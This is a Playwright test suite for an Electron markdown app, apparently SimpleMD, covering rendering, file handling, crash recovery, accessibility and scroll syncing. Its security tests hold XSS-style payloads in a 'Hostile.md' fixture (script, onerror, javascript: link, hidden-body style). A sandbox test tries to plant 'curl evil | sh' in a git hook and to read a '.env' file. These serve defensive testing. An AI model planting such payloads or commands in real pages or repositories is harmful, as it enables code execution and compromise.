import { expect, test } from '@playwright/test'
import { access, readFile, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { pathToFileURL } from 'node:url'
import { article, axeViolations, close, killTree, launch, makeNotes, removeDir, stubSaveDialog, type Launched } from './harness'

const NOTES = {
  'Answer.md': [
    '# Caching answer',
    '',
    '> [!TIP]',
    '> Start with a short TTL.',
    '',
    'The hit ratio \\(h\\), then display math:',
    '',
    '\\[ T = h \\cdot a + (1 - h) \\cdot b \\]',
    '',
    'A claim with a source.[^1]',
    '',
    '[^1]: The source.',
    ''
  ].join('\n'),
  'Tasks.md': '# Tasks\n\n- [ ] Ship it\n- [x] Plan it\n',
  'Hostile.md': [
    '# Hostile',
    '',
    '<script>window.__pwned = 1</script>',
    '<img src="x" onerror="window.__pwned = 2">',
    '<iframe src="https://example.com"></iframe>',
    '<style>body { display: none }</style>',
    '[click](javascript:window.__pwned=3)',
    '<input type="text" value="phish">',
    ''
  ].join('\n'),
  'AGENTS.md': '# Agent rules\n\nRun the tests.\n'
}

let run: Launched

test.afterEach(async () => {
  if (!run) return
  const notes = run.notes
  await close(run)
  await removeDir(notes)
})

async function openFile(name: string): Promise<void> {
  await run.page.getByRole('treeitem', { name, exact: true }).click()
  await expect(run.page.getByRole('tab', { name: new RegExp(`^${name}`) })).toHaveClass(/is-active/)
}

test('renders callouts, ChatGPT-style math and footnotes', async () => {
  run = await launch({ notes: await makeNotes(NOTES) })
  await openFile('Answer.md')
  const doc = article(run.page)
  await expect(doc.locator('.smd-callout')).toContainText('Start with a short TTL')
  await expect(doc.locator('.katex').first()).toBeVisible()
  await expect(doc.locator('.katex-display')).toHaveCount(1)
  await expect(doc.locator('.smd-footnotes, section.footnotes')).toContainText('The source.')
})

test('never runs or shows hostile content', async () => {
  run = await launch({ notes: await makeNotes(NOTES) })
  await openFile('Hostile.md')
  const doc = article(run.page)
  await expect(doc.locator('h1')).toHaveText('Hostile')
  await doc.getByText('click').click()
  const state = await run.page.evaluate(() => ({
    pwned: (window as unknown as { __pwned?: number }).__pwned,
    iframes: document.querySelectorAll('.smd-article iframe').length,
    styles: document.querySelectorAll('.smd-article style').length,
    textInputs: document.querySelectorAll('.smd-article input:not([type=checkbox])').length,
    bodyVisible: getComputedStyle(document.body).display !== 'none'
  }))
  expect(state).toEqual({ pwned: undefined, iframes: 0, styles: 0, textInputs: 0, bodyVisible: true })
})

test('clicking a task box saves the change to disk', async () => {
  run = await launch({ notes: await makeNotes(NOTES) })
  await openFile('Tasks.md')
  await article(run.page).locator('input.smd-task').first().click()
  const file = join(run.notes!, 'Tasks.md')
  await expect.poll(() => readFile(file, 'utf8')).toContain('- [x] Ship it')
})

test('a new document is written where Save As points', async () => {
  run = await launch({ notes: await makeNotes(NOTES) })
  const target = join(run.notes!, 'Fresh idea.md')
  await stubSaveDialog(run.app, target)
  await run.page.keyboard.press('Control+N')
  await run.page.locator('.cm-content').click()
  await run.page.keyboard.type('# Fresh idea\n\nWritten in SimpleMD.')
  await run.page.keyboard.press('Control+S')
  await expect.poll(() => readFile(target, 'utf8').catch(() => '')).toContain('Written in SimpleMD.')
  await expect(run.page.getByRole('tab', { name: /Fresh idea/ })).toHaveClass(/is-active/)
})

test('F2 renames a file on disk', async () => {
  run = await launch({ notes: await makeNotes(NOTES) })
  await run.page.getByRole('treeitem', { name: 'Tasks.md', exact: true }).click()
  await run.page.getByRole('treeitem', { name: 'Tasks.md', exact: true }).press('F2')
  const input = run.page.locator('.smd-sidebar input').first()
  await expect(input).toBeFocused()
  await input.fill('Todo.md')
  await input.press('Enter')
  await expect.poll(() => access(join(run.notes!, 'Todo.md')).then(() => true, () => false)).toBe(true)
  await expect(run.page.getByRole('treeitem', { name: 'Todo.md', exact: true })).toBeVisible()
})

test('shows what an agent changed on disk', async () => {
  run = await launch({ notes: await makeNotes(NOTES) })
  await openFile('Tasks.md')
  await writeFile(join(run.notes!, 'Tasks.md'), NOTES['Tasks.md'] + '- [ ] Added by an agent\n', 'utf8')
  await expect(run.page.locator('.smd-changebar')).toContainText(/1 change/)
  await expect(article(run.page)).toContainText('Added by an agent')
  await expect(article(run.page).locator('.smd-changed')).not.toHaveCount(0)
})

test('Paste from AI turns the clipboard into a new rendered document', async () => {
  run = await launch({ notes: await makeNotes(NOTES) })
  await run.app.evaluate(({ clipboard }) => clipboard.writeText('# Pasted answer\n\nFrom a chat.'))
  await run.page.locator('.smd-welcome, .smd-reader').first().click()
  await run.page.keyboard.press('Control+Shift+V')
  await expect(run.page.getByRole('tab', { name: /Pasted answer/ })).toBeVisible()
  await expect(article(run.page).locator('h1')).toHaveText('Pasted answer')
})

test('Quick Open finds and opens a file', async () => {
  run = await launch({ notes: await makeNotes(NOTES) })
  await run.page.locator('.smd-reader, .smd-welcome').first().click()
  await run.page.keyboard.press('Control+P')
  await run.page.keyboard.type('tasks')
  await run.page.keyboard.press('Enter')
  await expect(run.page.getByRole('tab', { name: /^Tasks\.md/ })).toHaveClass(/is-active/)
})

test('closing an edited tab asks before losing the edit', async () => {
  run = await launch({ notes: await makeNotes(NOTES) })
  await openFile('Tasks.md')
  await run.page.keyboard.press('Control+3')
  await run.page.locator('.cm-content').click()
  await run.page.keyboard.press('Control+End')
  await run.page.keyboard.type('\nunsaved line')
  await run.page.keyboard.press('Control+W')
  await expect(run.page.getByRole('alertdialog')).toContainText(/Save changes/i)
  await run.page.getByRole('button', { name: /cancel/i }).click()
  await expect(run.page.getByRole('tab', { name: /Tasks\.md, unsaved/ })).toBeVisible()
})

test('unsaved edits survive a crash', async () => {
  const notes = await makeNotes(NOTES)
  run = await launch({ notes })
  await openFile('Tasks.md')
  await run.page.keyboard.press('Control+3')
  await run.page.locator('.cm-content').click()
  await run.page.keyboard.press('Control+End')
  await run.page.keyboard.type('\nrecover me')
  const session = join(run.userData, 'recovery', 'session.json')
  await expect.poll(() => readFile(session, 'utf8').catch(() => ''), { timeout: 15_000 }).toContain('recover me')
  killTree(run)
  const userData = run.userData
  run = await launch({ notes, userData })
  await expect(run.page.locator('[role=dialog], [role=alertdialog]')).toContainText(/recover/i)
  await run.page.getByRole('button', { name: /restore/i }).click()
  await run.page.keyboard.press('Control+3')
  await expect(run.page.locator('.cm-content')).toContainText('recover me')
})

test('welcome and reading views pass automated accessibility checks', async () => {
  run = await launch({ notes: null })
  await expect(run.page.locator('.smd-welcome')).toBeVisible()
  // Let the entrance fade finish so colour contrast is measured at full opacity.
  await run.page.waitForTimeout(800)
  expect(await axeViolations(run.page)).toEqual([])
  await close(run)
  run = await launch({ notes: await makeNotes(NOTES) })
  await openFile('Answer.md')
  await run.page.waitForTimeout(800)
  // KaTeX keeps a visually hidden MathML copy beside its HTML; axe misreads that pair.
  expect(await axeViolations(run.page, { exclude: ['.katex'] })).toEqual([])
})

test('a compromised page still cannot reach files outside what was opened', async () => {
  run = await launch({ notes: await makeNotes({ ...NOTES, '.env': 'SECRET=1\n', '.git/hooks/pre-commit': '#!/bin/sh\n' }) })
  await openFile('Tasks.md')
  const notes = run.notes!
  const paths = {
    dir: notes,
    fileUrl: pathToFileURL(join(notes, 'Tasks.md')).href,
    env: join(notes, '.env'),
    hook: join(notes, '.git', 'hooks', 'pre-commit'),
    markdown: join(notes, 'Tasks.md')
  }
  const probe = await run.page.evaluate(async (p) => {
    const settle = (work: Promise<unknown>) => work.then(() => ({ ok: true }), () => ({ ok: false }))
    return {
      fetchFile: await settle(fetch(p.fileUrl).then((r) => (r.ok ? r.text() : Promise.reject(new Error(String(r.status)))))),
      readEnv: await settle(window.api.readFile(p.env)),
      writeHook: await settle(window.api.saveFile(p.hook, 'curl evil | sh')),
      trashRoot: await window.api.trashItem(p.dir),
      readMarkdown: await settle(window.api.readFile(p.markdown))
    }
  }, paths)
  expect(probe.fetchFile.ok).toBe(false)
  expect(probe.readEnv.ok).toBe(false)
  expect(probe.writeHook.ok).toBe(false)
  expect(probe.trashRoot).toBe(false)
  expect(probe.readMarkdown.ok).toBe(true)
  expect(await readFile(join(notes, '.git', 'hooks', 'pre-commit'), 'utf8')).toBe('#!/bin/sh\n')
})

test('split view: the editor follows the reader smoothly, without stepping back', async () => {
  const body = Array.from({ length: 160 }, (_, i) =>
    i % 8 === 0 ? `## Section ${i / 8 + 1}` : `Paragraph ${i}: synced scrolling should keep both panes on the same text while the reader scrolls smoothly.`
  ).join('\n\n')
  run = await launch({ notes: await makeNotes({ 'Long.md': `# Long\n\n${body}\n` }) })
  await openFile('Long.md')
  await run.page.keyboard.press('Control+2')
  await expect(run.page.locator('.cm-content')).toBeVisible()
  await run.page.waitForTimeout(600)
  // Scroll the reader smoothly and sample where the editor is on every frame.
  const samples: number[] = await run.page.evaluate(
    () =>
      new Promise<number[]>((done) => {
        const reader = document.querySelector('.smd-reader') as HTMLElement
        const editor = document.querySelector('.cm-scroller') as HTMLElement
        const out: number[] = []
        const start = performance.now()
        const step = (t: number): void => {
          const k = Math.min(1, (t - start) / 1500)
          reader.scrollTop = k * 2400
          out.push(editor.scrollTop)
          if (k < 1) requestAnimationFrame(step)
          else setTimeout(() => done(out), 300)
        }
        requestAnimationFrame(step)
      })
  )
  // While the reader glides (~27 px a frame) the editor should glide too: no backwards steps,
  // and no stair-stepping where it sits still for frames and then jumps whole lines at once.
  const steps = samples.slice(1).map((v, i) => v - samples[i])
  const moving = steps.slice(5, -20)
  const reversals = moving.filter((d) => d < -1).length
  const still = moving.filter((d) => Math.abs(d) < 0.5).length
  const biggest = Math.max(...moving)
  expect(samples.at(-1)!).toBeGreaterThan(500)
  expect(reversals).toBe(0)
  expect(still / moving.length).toBeLessThan(0.15)
  expect(biggest).toBeLessThan(60)
})

/** Wheel the pane `lead` with a mouse (one notch at a time) and record, every frame, how far
 *  each pane moved. Returns the frames where the leader moved but the other pane stood still. */
async function wheelStalls(lead: '.smd-reader' | '.cm-scroller'): Promise<{ moved: number; stalled: number }> {
  const box = (await run.page.locator(lead).boundingBox())!
  await run.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2)
  await run.page.evaluate(() => {
    const w = window as unknown as { samples: number[][] }
    w.samples = []
    const reader = document.querySelector('.smd-reader') as HTMLElement
    const editor = document.querySelector('.cm-scroller') as HTMLElement
    const tick = (): void => {
      w.samples.push([reader.scrollTop, editor.scrollTop])
      if (w.samples.length < 120) requestAnimationFrame(tick)
    }
    requestAnimationFrame(tick)
  })
  for (let i = 0; i < 8; i++) {
    await run.page.mouse.wheel(0, 100)
    await run.page.waitForTimeout(90)
  }
  await run.page.waitForTimeout(1200)
  const samples = await run.page.evaluate(() => (window as unknown as { samples: number[][] }).samples)
  const [l, f] = lead === '.smd-reader' ? [0, 1] : [1, 0]
  let moved = 0
  let stalled = 0
  for (let i = 1; i < samples.length; i++) {
    if (Math.abs(samples[i][l] - samples[i - 1][l]) <= 2) continue
    moved++
    if (Math.abs(samples[i][f] - samples[i - 1][f]) < 0.5) stalled++
  }
  return { moved, stalled }
}

test('split view: both panes move in the same frame under the mouse wheel, either way round', async () => {
  const body = Array.from({ length: 240 }, (_, i) =>
    i % 8 === 0 ? `## Section ${i / 8 + 1}` : `Paragraph ${i}: both panes should stay on the same text while either one is wheeled.`
  ).join('\n\n')
  run = await launch({ notes: await makeNotes({ 'Long.md': `# Long\n\n${body}\n` }) })
  await openFile('Long.md')
  await run.page.keyboard.press('Control+2')
  await expect(run.page.locator('.cm-content')).toBeVisible()
  await run.page.waitForTimeout(600)

  // A notch glides over many frames, and the other pane moves on every one of them
  // (a frame late is the trailing people see).
  const fromReader = await wheelStalls('.smd-reader')
  expect(fromReader.moved).toBeGreaterThan(20)
  expect(fromReader.stalled).toBe(0)

  const fromEditor = await wheelStalls('.cm-scroller')
  expect(fromEditor.moved).toBeGreaterThan(20)
  expect(fromEditor.stalled).toBe(0)
})

test('split view shows the reader on the left and the editor on the right, like the switch', async () => {
  run = await launch({ notes: await makeNotes(NOTES) })
  await openFile('Answer.md')
  await run.page.keyboard.press('Control+2')
  await expect(run.page.locator('.cm-content')).toBeVisible()

  const reader = (await run.page.locator('.smd-reader-pane').boundingBox())!
  const editor = (await run.page.locator('.smd-editor-pane').boundingBox())!
  expect(reader.x).toBeLessThan(editor.x)
  const switchX = async (name: string) => (await run.page.getByRole('radio', { name, exact: true }).boundingBox())!.x
  expect(await switchX('Read')).toBeLessThan(await switchX('Edit'))
})

test('the sidebar opens a file and a folder with buttons', async () => {
  run = await launch({ notes: await makeNotes(NOTES) })
  const elsewhere = await makeNotes({ 'Elsewhere.md': '# Far away note\n\nOpened with a button.\n' })
  try {
    await run.app.evaluate(({ dialog }, file) => {
      dialog.showOpenDialog = (async () => ({ canceled: false, filePaths: [file] })) as typeof dialog.showOpenDialog
    }, join(elsewhere, 'Elsewhere.md'))
    await run.page.getByRole('button', { name: 'Open file', exact: true }).click()
    await expect(article(run.page).getByRole('heading', { name: 'Far away note' })).toBeVisible()

    await run.app.evaluate(({ dialog }, folder) => {
      dialog.showOpenDialog = (async () => ({ canceled: false, filePaths: [folder] })) as typeof dialog.showOpenDialog
    }, elsewhere)
    await run.page.getByRole('button', { name: 'Open folder', exact: true }).click()
    await expect(run.page.getByRole('treeitem', { name: 'Elsewhere.md', exact: true })).toBeVisible()
  } finally {
    await removeDir(elsewhere)
  }
})
